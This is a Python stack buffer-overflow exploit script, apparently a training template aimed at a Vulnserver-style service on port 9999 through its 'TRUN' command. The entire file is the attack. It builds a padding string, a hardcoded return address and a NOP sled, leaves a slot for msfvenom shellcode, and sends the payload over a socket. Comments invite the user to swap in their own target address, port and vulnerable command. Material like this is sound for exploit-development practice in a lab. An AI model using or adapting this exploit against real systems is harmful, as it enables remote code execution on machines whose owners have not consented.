#!/usr/bin/python
import sys, socket

overflow = ("") # This is where the output from msfvenom should go

returnaddress = "\xaf\x11\x50\x62" #CHANGE THIS
address = '127.0.0.1' #CHANGE THIS
port = 9999 #CHANGE THIS
vulncommand = 'TRUN /.:/' # CHANGE THIS, the vulnerable command that was found in the spiking section would go here

shellcode = "A" * 2003 + returnaddress + "\x90" * 32 + overflow

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((address,port))

	s.send((vulncommand + shellcode))
	s.close()

except:
	print "Error connecting to server"
	sys.exit()
